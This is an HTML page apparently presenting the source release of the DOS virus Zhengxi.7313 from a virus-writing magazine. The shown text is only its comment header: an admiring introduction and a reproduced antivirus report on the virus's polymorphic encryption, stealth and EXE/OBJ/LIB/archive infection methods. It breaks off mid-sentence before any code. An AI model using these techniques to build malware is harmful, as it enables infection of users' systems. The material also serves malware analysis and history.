<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Zhengxi.7313.a - zhengxi.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;                      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                      ³     Zhengxi.7313     ³Û</span><span class="sc0">
</span><span class="sc1">;                      ³ original source code ³Û</span><span class="sc0">
</span><span class="sc1">;                      ÀÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; At last... the source of  the most complex virus  ever is  published in a</span><span class="sc0">
</span><span class="sc1">; virus magazine. And we're glad  that the fortunate magazine is 29A :) You</span><span class="sc0">
</span><span class="sc1">; are stepping  with the reader cool  smooth  scroll through  the  original</span><span class="sc0">
</span><span class="sc1">; source code of the best of the three versions (7271, 7307, 7313) of Zhen-</span><span class="sc0">
</span><span class="sc1">; gxi. This source code, as the compiled  version  of the  virus itself, is</span><span class="sc0">
</span><span class="sc1">; quite hard to understand. Anyway, i decided  to leave the source code 'as</span><span class="sc0">
</span><span class="sc1">; is', albeit some  weeks ago i started making it up  a bit and  commenting</span><span class="sc0">
</span><span class="sc1">; some uncommented code so it would be more easy and clear to read. At last</span><span class="sc0">
</span><span class="sc1">; i decided to stop spending my  time on this and give you the *truly* ori-</span><span class="sc0">
</span><span class="sc1">; ginal source code, so  you can know the way in which its author coded it,</span><span class="sc0">
</span><span class="sc1">; you can read the original comments (some  of them in russian), and so on.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The original source code is formed  by some ASI, ASM and INC files, which</span><span class="sc0">
</span><span class="sc1">; make  the virus  compiling  harder than the virus coding itself :) That's</span><span class="sc0">
</span><span class="sc1">; why i included a ZIP which contains the compiled version of Zhengxi.7313.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I must give thanks to the author of this rocking virus because of the su-</span><span class="sc0">
</span><span class="sc1">; permarvel he coded and  for releasing the  original  source code (btw, he</span><span class="sc0">
</span><span class="sc1">; seems to have a great sense of humour :), and to the friend who gave this</span><span class="sc0">
</span><span class="sc1">; jewel to me, who  wishes to remain anonymous. As a last  thing, for those</span><span class="sc0">
</span><span class="sc1">; who still don't know  what does Zhengxi do (!), here's a very good report</span><span class="sc0">
</span><span class="sc1">; about  the  Zhengxi  virus family, written by Eugene Kaspersky, who, btw,</span><span class="sc0">
</span><span class="sc1">; should use the money he earns with AVP for taking some english classes :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ÄÄ´ Zhengxi family ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is the  family of very dangerous, polymorphic  and stealth parasitic</span><span class="sc0">
</span><span class="sc1">; viruses. These  viruses  are more  that 7k of length, very complex, maybe</span><span class="sc0">
</span><span class="sc1">; the  most complex DOS viruses. These  viruses infect EXE, OBJ and LIB fi-</span><span class="sc0">
</span><span class="sc1">; les, and append COM droppers to ZIP, ARJ, HA, and RAR archives. The viru-</span><span class="sc0">
</span><span class="sc1">; ses contain the text strings:</span><span class="sc0">
</span><span class="sc1">;                                             </span><span class="sc0">
</span><span class="sc1">;   Abnormal program termination                                   </span><span class="sc0">
</span><span class="sc1">;   The Virus/DOS 0.54  Copyright (c) 1995 Zhengxi Ltd            </span><span class="sc0">
</span><span class="sc1">;   Warning! This program for internal use only!                  </span><span class="sc0">
</span><span class="sc1">;                                                                  </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Installation                                                </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄ                                                  </span><span class="sc0">
</span><span class="sc1">; The virus code  receives  the  control from different points depending on</span><span class="sc0">
</span><span class="sc1">; the infection way, but in all cases  the  destination is  the polymorphic</span><span class="sc0">
</span><span class="sc1">; decryption  routine. In EXE files (appending) the  decryption routine re-</span><span class="sc0">
</span><span class="sc1">; ceives  the control immediately when EXE  file is loaded  into the memory</span><span class="sc0">
</span><span class="sc1">; for execution; in EXE  files (inserting), from the  loader  code (see EXE</span><span class="sc0">
</span><span class="sc1">; infection); in the files linked  with infected OBJ/LIB files, from a call</span><span class="sc0">
</span><span class="sc1">; instruction (see OBJ/LIB infection); the COM droppers have a jmp instruc-</span><span class="sc0">
</span><span class="sc1">; tion at  their beginning, which brings the control to the decryption rou-</span><span class="sc0">
</span><span class="sc1">; tine.     </span><span class="sc0">
</span><span class="sc1">;                                                                             </span><span class="sc0">
</span><span class="sc1">; Being decrypted, the  virus installation  routines receives  the control.</span><span class="sc0">
</span><span class="sc1">; The virus  hooks int 1 (one step tracing), and traces int 21h. While tra-</span><span class="sc0">
</span><span class="sc1">; cing, the virus looks for  some specific code  within the int 21h handler</span><span class="sc0">
</span><span class="sc1">; (that code is present in DOS 5.x and DOS 6.x). If such code is found, the</span><span class="sc0">
</span><span class="sc1">; virus checks several conditions, and terminates installation  in some ca-</span><span class="sc0">
</span><span class="sc1">; ses. These cases are the ones below:                            </span><span class="sc0">
</span><span class="sc1">;                                                                  </span><span class="sc0">
</span><span class="sc1">; - Microsoft Windows is installed                               </span><span class="sc0">
</span><span class="sc1">; - Boot drive is A: or B:                                      </span><span class="sc0">
</span><span class="sc1">; - Int 8, 13h, 28h point to the same  segment (to exit installation if any</span><span class="sc0">
</span><span class="sc1">;   antivirus monitor is installed?)                             </span><span class="sc0">
</span><span class="sc1">; - Host file's  day (date and time stamp) is the same or near  the current</span><span class="sc0">
</span><span class="sc1">;   day (if the two highest  bits of current day number xored with the file</span><span class="sc0">
</span><span class="sc1">;   day is equal to zero)                                        </span><span class="sc0">
</span><span class="sc1">;                                                                             </span><span class="sc0">
</span><span class="sc1">; Then the virus allocates the block of the system memory for the virus TSR</span><span class="sc0">
</span><span class="sc1">; copy, stores in its body 11 bytes from the address of the int 21h handler</span><span class="sc0">
</span><span class="sc1">; and patches int 21h  code with  a far  call instruction (2f ff 1e ?? ??),</span><span class="sc0">
</span><span class="sc1">; which  brings the  control  to the  int 25h handler (absolute disk read).</span><span class="sc0">
</span><span class="sc1">; Then the  virus stores the first five bytes of int 25h handler and writes</span><span class="sc0">
</span><span class="sc1">; there other five bytes, which become the  far jmp to the  virus code. The</span><span class="sc0">
</span><span class="sc1">; result looks like follows:                        </span><span class="sc0">
</span><span class="sc1">;                                                                </span><span class="sc0">
</span><span class="sc1">;      int 21h handler:</span><span class="sc0">
</span><span class="sc1">;              ...              ...</span><span class="sc0">
</span><span class="sc1">;   ÚÄÄÄÄÄÄÄÄÄ 2e ff 1f ????    call far cs:int_25h</span><span class="sc0">
</span><span class="sc1">;   ³          c7 06            ????                 ; Magic word?</span><span class="sc0">
</span><span class="sc1">;   ³ int_25h: ???? ????        ???? ????            ; Far addr of int 25h</span><span class="sc0">
</span><span class="sc1">;   ³          ...              ...</span><span class="sc0">
</span><span class="sc1">;   ³</span><span class="sc0">
</span><span class="sc1">;   À&gt; int 25h handler:</span><span class="sc0">
</span><span class="sc1">;   ÚÄÄÄÄÄÄÄÄÄ ea ???? ????     jmp far virus_handler</span><span class="sc0">
</span><span class="sc1">;   ³          ...              ...</span><span class="sc0">
</span><span class="sc1">;   À&gt; virus handler:</span><span class="sc0">
</span><span class="sc1">;              2e 8f 06 ...     pop cs:caller_ip</span><span class="sc0">
</span><span class="sc1">;              ...              ...</span><span class="sc0">
</span><span class="sc1">;                                                               </span><span class="sc0">
</span><span class="sc1">; As result, the  virus has the  same handler to intercept both int 21h and</span><span class="sc0">
</span><span class="sc1">; int 25h calls. To separate these calls, Zhengxi checks the address of the</span><span class="sc0">
</span><span class="sc1">; caller (the caller_ip). If the call  goes to the int 21h handler, the vi-</span><span class="sc0">
</span><span class="sc1">; rus passes the  control to its int 21h handler routine; in  another case,</span><span class="sc0">
</span><span class="sc1">; the virus int 25h handler receives the control.         </span><span class="sc0">
</span><span class="sc1">;                                                                 </span><span class="sc0">
</span><span class="sc1">; The installation routine is complete, but the virus can move  its code to</span><span class="sc0">
</span><span class="sc1">; other memory  blocks (see int 21h  handler analysis). So, the TSR copy of</span><span class="sc0">
</span><span class="sc1">; the virus  does not occupy the  same blocks of the system memory, but may</span><span class="sc0">
</span><span class="sc1">; move itself to other addresses, including UMB ones.              </span><span class="sc0">
</span><span class="sc1">;                                                                 </span><span class="sc0">
</span><span class="sc1">; Then the virus returns the  control to the host program. There  are three</span><span class="sc0">
</span><span class="sc1">; different  variants  of such return, and they depend on the infection me-</span><span class="sc0">
</span><span class="sc1">; thod. In case of a COM dropper the virus just displays this message:  </span><span class="sc0">
</span><span class="sc1">;                                                                  </span><span class="sc0">
</span><span class="sc1">;  Abnormal program termination                            </span><span class="sc0">
</span><span class="sc1">;                                                       </span><span class="sc0">
</span><span class="sc1">; And returns to DOS with the terminate function (int 21h, ah=4ch). In case</span><span class="sc0">
</span><span class="sc1">; of the EXE-appending infection method the virus restores the original fi-</span><span class="sc0">
</span><span class="sc1">; le header by using its  polymorphic engine (generates the polymorphic de-</span><span class="sc0">
</span><span class="sc1">; cryption routine, and executes  it for restoring the original header (see</span><span class="sc0">
</span><span class="sc1">; EXE infection below). In case of the EXE-inserting way the virus just re-</span><span class="sc0">
</span><span class="sc1">; turns to the host program because the virus loader inserted into the file</span><span class="sc0">
</span><span class="sc1">; restores the original  code itself. In  case of being an OBJ/LIB file the</span><span class="sc0">
</span><span class="sc1">; virus also just returns to the host (see OBJ/LIB infection below).</span><span class="sc0">
</span><span class="sc1">;                                                             </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Int 21h handler                                      </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                                        </span><span class="sc0">
</span><span class="sc1">; Zhengxi intercepts 18 int 21h functions:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   3dh, 6ch      - Open/create file</span><span class="sc0">
</span><span class="sc1">;   3eh           - Close file</span><span class="sc0">
</span><span class="sc1">;   3fh           - Read file</span><span class="sc0">
</span><span class="sc1">;   42h           - Lseek</span><span class="sc0">
</span><span class="sc1">;   4bh           - File execution</span><span class="sc0">
</span><span class="sc1">;   41h           - Delete file</span><span class="sc0">
</span><span class="sc1">;   11h, 12h      - Findfirst/findnext FCB</span><span class="sc0">
</span><span class="sc1">;   4eh, 4fh      - Findfirst/findnext ASCII</span><span class="sc0">
</span><span class="sc1">;   00h, 4ch      - Terminate</span><span class="sc0">
</span><span class="sc1">;   31h           - Terminate and stay resident</span><span class="sc0">
</span><span class="sc1">;   67h           - Set handle count</span><span class="sc0">
</span><span class="sc1">;   48h, 49h, 4ah - Memory managing functions (allocate, free, resize)</span><span class="sc0">
</span><span class="sc1">;                                                     </span><span class="sc0">
</span><span class="sc1">; The set handle count, file execution and memory managing functions are u-</span><span class="sc0">
</span><span class="sc1">; sed by the virus to hide its code into the system memory (Zhengxi manipu-</span><span class="sc0">
</span><span class="sc1">; lates MCB blocks to remain invisible on the memory map while using memory</span><span class="sc0">
</span><span class="sc1">; browsing utilities).</span><span class="sc0">
</span><span class="sc1">;                                                           </span><span class="sc0">
</span><span class="sc1">; While intercepting terminate, TSR and free  memory DOS functions, Zhengxi</span><span class="sc0">
</span><span class="sc1">; moves its code to a new address in the system memory. The virus allocates</span><span class="sc0">
</span><span class="sc1">; a  new memory block (may be  a conventional or UMB memory block), and co-</span><span class="sc0">
</span><span class="sc1">; pies itself there. So, while installing, the  virus  does not  affect UMB</span><span class="sc0">
</span><span class="sc1">; blocks to place its TSR copy, but then it may move into UMB, and hide it-</span><span class="sc0">
</span><span class="sc1">; self there.                                         </span><span class="sc0">
</span><span class="sc1">;                                                           </span><span class="sc0">
</span><span class="sc1">; While file opening the virus performs several different calls. First, the</span><span class="sc0">
</span><span class="sc1">; virus checks the opening mode, and if the file is opened for writing, the</span><span class="sc0">
</span><span class="sc1">; virus disinfects the file.                                   </span><span class="sc0">
</span><span class="sc1">;                                                             </span><span class="sc0">
</span><span class="sc1">; Before disinfection the virus  checks the file is being accessed, and the</span><span class="sc0">
</span><span class="sc1">; program  that is accessing that file (the caller). The virus compares the</span><span class="sc0">
</span><span class="sc1">; name of this program or caller with a name list (see below), and does not</span><span class="sc0">
</span><span class="sc1">; disinfect the accessed file if the caller name is found in that list.</span><span class="sc0">
</span><span class="sc1">;                                                        </span><span class="sc0">
</span><span class="sc1">;   UUENCODE.EXE, PKLITE.EXE, LZEXE.EXE, NDD.EXE, DIET.EXE, AFD.EXE, SD.EXE</span><span class="sc0">
</span><span class="sc1">;   SPEEDDSK.EXE, DEFRAG.EXE, TLINK.EXE, LINK.EXE</span><span class="sc0">
</span><span class="sc1">;                                                       </span><span class="sc0">
</span><span class="sc1">; In case of the ah=3d00h function (open read-only) the virus performs some</span><span class="sc0">
</span><span class="sc1">; strange actions. It scans  the caller code  and patches it. It looks like</span><span class="sc0">
</span><span class="sc1">; patching  some antivirus scanner. Fortunately, the  virus  has a bug, and</span><span class="sc0">
</span><span class="sc1">; that branch is never executed.                     </span><span class="sc0">
</span><span class="sc1">;                                               </span><span class="sc0">
</span><span class="sc1">; While opening the file, the virus also  brings the control to its stealth</span><span class="sc0">
</span><span class="sc1">; routine: it replaces the file length with the original one.   </span><span class="sc0">
</span><span class="sc1">;                                                           </span><span class="sc0">
</span><span class="sc1">; While reading  from a file, Zhengxi calls the stealth routine. In case of</span><span class="sc0">
</span><span class="sc1">; reading  from the header of the  infected file  the virus reads, decrypts</span><span class="sc0">
</span><span class="sc1">; and copies the original header into the reading buffer. </span><span class="sc0">
</span><span class="sc1">;                                                        </span><span class="sc0">
</span><span class="sc1">; In case  of the lseek function the virus brings the  control  to other of</span><span class="sc0">
</span><span class="sc1">; its stealth routines: it doesn't allow to seek out of  the  original file</span><span class="sc0">
</span><span class="sc1">; length.                                              </span><span class="sc0">
</span><span class="sc1">;                                                         </span><span class="sc0">
</span><span class="sc1">; While deleting an infected file, the virus disinfects it.    </span><span class="sc0">
</span><span class="sc1">;                                                                             </span><span class="sc0">
</span><span class="sc1">; While looking for files with findfirst/findnext, Zhengxi replaces the fi-</span><span class="sc0">
</span><span class="sc1">; le length with the original one if the file is infected.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Findfirst/findnext ASCII calls are also  used by the virus to catch files</span><span class="sc0">
</span><span class="sc1">; for infection. The virus saves the name of any file that is accessed with</span><span class="sc0">
</span><span class="sc1">; the findfirst function, and approximately each 5th file (with probability</span><span class="sc0">
</span><span class="sc1">; 3/16) accessed  with the findnext function. The virus has only one buffer</span><span class="sc0">
</span><span class="sc1">; for the file name, so every next name overwrites the previous one.</span><span class="sc0">
</span><span class="sc1">;                                                              </span><span class="sc0">
</span><span class="sc1">; While closing any file the virus checks and infects it with the name that</span><span class="sc0">
</span><span class="sc1">; that is stored in the buffer. The virus also infects the file that is be-</span><span class="sc0">
</span><span class="sc1">; ing closed, but  is  does  it with probability 1/4 (by the result  of its</span><span class="sc0">
</span><span class="sc1">; random generator).</span><span class="sc0">
</span><span class="sc1">;                                                    </span><span class="sc0">
</span><span class="sc1">;                                                      </span><span class="sc0">
</span><span class="sc1">; Infection                                         </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄ                                          </span><span class="sc0">
</span><span class="sc1">; Before infecting a file, Zhengxi checks several conditions:   </span><span class="sc0">
</span><span class="sc1">;                                                      </span><span class="sc0">
</span><span class="sc1">; - The file  is  not "just created", by comparing the  current  day number</span><span class="sc0">
</span><span class="sc1">;   with the file date and time stamp (as while installing itself)  </span><span class="sc0">
</span><span class="sc1">; - The file is local, and not on A: or B: drive        </span><span class="sc0">
</span><span class="sc1">; - The file name is not *.?V? (*.OVL)                 </span><span class="sc0">
</span><span class="sc1">; - There is enough free disk space (it checks this with int 21h, ah=36h)</span><span class="sc0">
</span><span class="sc1">;                                                               </span><span class="sc0">
</span><span class="sc1">; If all this is ok, the virus reads the file header and checks it for EXE,</span><span class="sc0">
</span><span class="sc1">; OBJ, LIB and archives stamps.                              </span><span class="sc0">
</span><span class="sc1">;                                                           </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Infecting EXE files                                  </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                                 </span><span class="sc0">
</span><span class="sc1">; Zhengxi infects EXE files  by using three  different  infection  methods:</span><span class="sc0">
</span><span class="sc1">; appending, inserting, and infecting archives in self-extracting files.</span><span class="sc0">
</span><span class="sc1">;                                                             </span><span class="sc0">
</span><span class="sc1">; At first, the  virus checks  the file  structure, and if it is a self-ex-</span><span class="sc0">
</span><span class="sc1">; tracting EXE file (created by ZIP2EXE, for  instance), Zhengxi infects it</span><span class="sc0">
</span><span class="sc1">; using the same method it uses when infecting archives (ZIP, ARJ, HA, RAR)</span><span class="sc0">
</span><span class="sc1">; that is, creating a COM dropper and adding it to the archive contents.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Then the virus  checks the  file length, and doesn't infect files  with a</span><span class="sc0">
</span><span class="sc1">; length lesser than 400h (1024) bytes. If the length of the loadable modu-</span><span class="sc0">
</span><span class="sc1">; dule (note: not the file length) is larger that 32k, Zhengxi  inserts its</span><span class="sc0">
</span><span class="sc1">; own loader int the middle of the file. In other case, it infects the file</span><span class="sc0">
</span><span class="sc1">; by the appending method.                               </span><span class="sc0">
</span><span class="sc1">;                                                    </span><span class="sc0">
</span><span class="sc1">; While infecting files by the appending method, Zhengxi reads file header,</span><span class="sc0">
</span><span class="sc1">; encrypts  and saves it to the end  of the file. Then it runs its polymor-</span><span class="sc0">
</span><span class="sc1">; phic  generator, and saves the encrypted  virus body and  the polymorphic</span><span class="sc0">
</span><span class="sc1">; loops to  the end of the file. For finishing  the file infection, Zhengxi</span><span class="sc0">
</span><span class="sc1">; increases the file length  to a value  that divided  by 9dh  gives 25h as</span><span class="sc0">
</span><span class="sc1">; rest (this  is the virus ID stamp, its infection  mark), and modifies the</span><span class="sc0">
</span><span class="sc1">; EXE header fields (registers and module length). </span><span class="sc0">
</span><span class="sc1">;                                                                             </span><span class="sc0">
</span><span class="sc1">; Note: Zhengxi encrypts the original  host header with the polymorphic en-</span><span class="sc0">
</span><span class="sc1">; cryption  loop, and that loop  is different  that the routine it uses for</span><span class="sc0">
</span><span class="sc1">; encrypting the virus body. Then, the  virus calls its polymorphic  engine</span><span class="sc0">
</span><span class="sc1">; twice: while encrypting the original EXE header, and while encrypting the</span><span class="sc0">
</span><span class="sc1">; main body.                                </span><span class="sc0">
</span><span class="sc1">;                                                 </span><span class="sc0">
</span><span class="sc1">; While executing an  infected EXE file, the  decryption  loop restores the</span><span class="sc0">
</span><span class="sc1">; main virus body, but not original file header. To return to the host, the</span><span class="sc0">
</span><span class="sc1">; virus has to decrypt the host data, but the engine generates random loops</span><span class="sc0">
</span><span class="sc1">; with random selected encryption functions. To solve that problem, Zhengxi</span><span class="sc0">
</span><span class="sc1">; stores  the initial random generator values while encrypting the host da-</span><span class="sc0">
</span><span class="sc1">; ta, and runs the polymorphic generator with the same values while decryp-</span><span class="sc0">
</span><span class="sc1">; ting those data. As result, the generator brings  the same code which was</span><span class="sc0">
</span><span class="sc1">; used for encrypting the host header, and being executed, that routine de-</span><span class="sc0">
</span><span class="sc1">; crypts it.                     </span><span class="sc0">
</span><span class="sc1">;                                                       </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Infecting EXE Files (inserting)                    </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                    </span><span class="sc0">
</span><span class="sc1">; If the file length is above 32k, the virus  seeks to the beginning of the</span><span class="sc0">
</span><span class="sc1">; EXE main module (just after EXE header), reads 6k of code, and  looks for</span><span class="sc0">
</span><span class="sc1">; C/Pascal  routines  there. Usually C/Pascal  routines begin from the same</span><span class="sc0">
</span><span class="sc1">; "header" that saves the BP register, and moves the stack pointer to BP.</span><span class="sc0">
</span><span class="sc1">;                                                    </span><span class="sc0">
</span><span class="sc1">; Zhengxi scans the  code for  those "headers" and, if  such code is found,</span><span class="sc0">
</span><span class="sc1">; the virus  scans the next 54h bytes of  code for a ret or a call far ins-</span><span class="sc0">
</span><span class="sc1">; truction to  prevent an overlap  of the next subroutine, or relocated ad-</span><span class="sc0">
</span><span class="sc1">; dress. If such  code (ret or call far) is found, the virus exits from its</span><span class="sc0">
</span><span class="sc1">; infection routine.              </span><span class="sc0">
</span><span class="sc1">;                                                      </span><span class="sc0">
</span><span class="sc1">; Then the virus  reads 54h bytes of  that routine, overwrites  it with the</span><span class="sc0">
</span><span class="sc1">; code of its loader, and then  encrypts the main virus body with its poly-</span><span class="sc0">
</span><span class="sc1">; morphic engine, and saves  it to  the end of  the  file. Then Zhengxi en-</span><span class="sc0">
</span><span class="sc1">; crypts with  a simple  sub function the original subroutine code  and the</span><span class="sc0">
</span><span class="sc1">; second part of the loader, and  saves it to the end of the file. Then the</span><span class="sc0">
</span><span class="sc1">; virus writes the random data to the end  of the file  in the  same way as</span><span class="sc0">
</span><span class="sc1">; in the "appending" infection method.     </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Not infected         Infected</span><span class="sc0">
</span><span class="sc1">;    ÄÄÄÄÄÄÄÄÄÄÄÄ         ÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;   ³EXE header    ³     ³EXE header    ³</span><span class="sc0">
</span><span class="sc1">;   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;   ³Main EXE code ³     ³Main EXE code ³</span><span class="sc0">
</span><span class="sc1">;   Ã--------------´     Ã--------------´</span><span class="sc0">
</span><span class="sc1">;   ³C/Pascal subr ÃÄÄ¿  ³Virus loader  ³ Part 1, 52h bytes, not encrypted</span><span class="sc0">
</span><span class="sc1">;   Ã--------------´  ³  Ã--------------´</span><span class="sc0">
</span><span class="sc1">;   ³              ³  ³  ³Main EXE code ³</span><span class="sc0">
</span><span class="sc1">;   ³              ³  ³  ³(continued)   ³</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ  ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;                     ³  ³Virus         ³ Encrypted with polymorphic loops</span><span class="sc0">
</span><span class="sc1">;                     ³  Ã--------------´</span><span class="sc0">
</span><span class="sc1">;                     ³  ³Virus loader  ³ Part 2, encrypted with sub</span><span class="sc0">
</span><span class="sc1">;                     ³  Ã--------------´ 70h bytes</span><span class="sc0">
</span><span class="sc1">;                     ÀÄ&gt;³Saved code    ³ Original code of the patched subr,</span><span class="sc0">
</span><span class="sc1">;                        Ã--------------´ 52h bytes, encrypted with sub</span><span class="sc0">
</span><span class="sc1">;                        ³Random data   ³ File length/9dh, the rest is 25h</span><span class="sc0">
</span><span class="sc1">;                        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Being executed, the loader looks  for the host file name by using the PSP</span><span class="sc0">
</span><span class="sc1">; fields, opens the file, seeks  to the file end, then  reads, decrypts and</span><span class="sc0">
</span><span class="sc1">; executes the second  part of the dropper. This part restores the  patched</span><span class="sc0">
</span><span class="sc1">; subroutine, allocates system memory (conventional or UMB), reads the main </span><span class="sc0">
</span><span class="sc1">; virus body, and  passes  the control to  the decryption polymorphic loop.</span><span class="sc0">
</span><span class="sc1">; That loop  decrypts the virus body, and passes  the control  to Zhengxi's </span><span class="sc0">
</span><span class="sc1">; installation routine.</span><span class="sc0">
</span><span class="sc1">;                                                      </span><span class="sc0">
</span><span class="sc1">; This is a very  insidious infection  way. The virus code is hidden in the</span><span class="sc0">
</span><span class="sc1">; file, and there is no  direct entry to the virus code from the file head-</span><span class="sc0">
</span><span class="sc1">; er. The subroutine replaced with  virus loader may be a "seldom-executed"</span><span class="sc0">
</span><span class="sc1">; one. For  instance, a subroutine which displays  an error message. So the</span><span class="sc0">
</span><span class="sc1">; virus may "sleep" in such  files for a long  time, and then jump  out and      </span><span class="sc0">
</span><span class="sc1">; infect the system under some limited conditions.      </span><span class="sc0">
</span><span class="sc1">;                                                 </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Infecting archives                  </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; In case of having to infect  an archive, Zhengxi builds in memory the in-</span><span class="sc0">
</span><span class="sc1">; fected COM dropper image, and appends it to  the archive. Those COM drop-</span><span class="sc0">
</span><span class="sc1">; pers always begin with a jmp instruction followed by random data, the en-</span><span class="sc0">
</span><span class="sc1">; crypted virus  code and the decryption polymorphic loop. The jmp instruc-</span><span class="sc0">
</span><span class="sc1">; tion brings the control to this decryption loop.</span><span class="sc0">
</span><span class="sc1">;                                              </span><span class="sc0">
</span><span class="sc1">; The name of the COM dropper is random  selected and  finished with a .COM</span><span class="sc0">
</span><span class="sc1">; extension, for instance:                 </span><span class="sc0">
</span><span class="sc1">;                                      </span><span class="sc0">
</span><span class="sc1">;   HAIF.COM, UCM.COM, DOO.COM, VLG.COM, and so on.   </span><span class="sc0">
</span><span class="sc1">;                                           </span><span class="sc0">
</span><span class="sc1">; While processing the archive fields, Zhengxi does not use any external u-</span><span class="sc0">
</span><span class="sc1">; tility, but fills by itself all  the necessary fields. The virus does not</span><span class="sc0">
</span><span class="sc1">; pack the dropper: it uses the "stored" method (the virus is stored in the</span><span class="sc0">
</span><span class="sc1">; archive "as is"). While infecting, Zhengxi checks the contents of the ar-</span><span class="sc0">
</span><span class="sc1">; chives, and does not infect them twice.       </span><span class="sc0">
</span><span class="sc1">;                                             </span><span class="sc0">
</span><span class="sc1">;                                        </span><span class="sc0">
</span><span class="sc1">; Infecting OBJ and LIB files                        </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                             </span><span class="sc0">
</span><span class="sc1">; While infecting OBJ/LIB modules, Zhengxi checks  the fields  of the file,</span><span class="sc0">
</span><span class="sc1">; creates, and  inserts there  a new object record which contains the viral</span><span class="sc0">
</span><span class="sc1">; code, encrypted with two polymorphic loops.    </span><span class="sc0">
</span><span class="sc1">;                                         </span><span class="sc0">
</span><span class="sc1">; While scanning object files, the virus checks the code of these files for</span><span class="sc0">
</span><span class="sc1">; a C/Pascal subroutine "header" as well as while inserting into EXE files,</span><span class="sc0">
</span><span class="sc1">; and infects the  files only if that code is  found. But if the OBJ or the</span><span class="sc0">
</span><span class="sc1">; LIB module doesn't contain such code, the virus  does not drop the loader</span><span class="sc0">
</span><span class="sc1">; code there, but overwrites a C/Pascal header with a call instruction.</span><span class="sc0">
</span><span class="sc1">;                              </span><span class="sc0">
</span><span class="sc1">; Being linked  to an executable  file, that call brings the control to the</span><span class="sc0">
</span><span class="sc1">; virus polymorphic decryption loop. That loop decrypts the viral  code and</span><span class="sc0">
</span><span class="sc1">; passes the control to the virus installation routine.</span><span class="sc0">
</span><span class="sc1">;                   </span><span class="sc0">
</span><span class="sc1">; As well as in EXE files (inserting), that call may never receive the con-</span><span class="sc0">
</span><span class="sc1">; trol, so Zhengxi may sleep for a long time. But under some conditions the </span><span class="sc0">
</span><span class="sc1">; virus may jump out and infect the system.</span><span class="sc0">
</span><span class="sc1">;                          </span><span class="sc0">
</span><span class="sc1">;                     </span><span class="sc0">
</span><span class="sc1">; Int 25h handler </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ          </span><span class="sc0">
</span><span class="sc1">; This handler  carries out the stealth routine on int 25h level. While ac-</span><span class="sc0">
</span><span class="sc1">; cessing  to the directory entries, the virus substitutes the  file length</span><span class="sc0">
